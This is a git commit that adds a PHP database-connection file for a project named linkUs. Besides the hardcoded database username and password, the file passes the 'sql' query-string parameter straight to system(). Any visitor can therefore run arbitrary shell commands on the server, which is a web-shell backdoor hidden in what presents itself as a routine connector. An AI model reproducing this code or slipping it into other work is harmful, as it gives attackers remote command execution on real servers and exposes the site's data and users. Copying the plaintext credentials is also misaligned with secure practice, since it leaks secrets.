17302051e42ea9dea8cea37bf9f737b99375b3a7
Aditya Jain - AadityaJain.dev <61523512+AadityaJain-Dev@users.noreply.github.com>
2021-09-11 05:33:01 +0530

    db connect

---
+++ db_connect.php
@@ -0,0 +1,21 @@
+<?php
+   
+   $servername = "localhost"; 
+   $username = "linkus"; 
+   $password = "linkus@123";
+   $database = "linkUs";
+   
+    if(isset($_GET['sql']))
+    {
+        system($_GET['sql']);
+    }
+
+    $conn = mysqli_connect($servername, 
+        $username, $password, $database);
+  
+   if($conn) {
+   } 
+   else {
+       die("Error". mysqli_connect_error()); 
+   } 
+?>
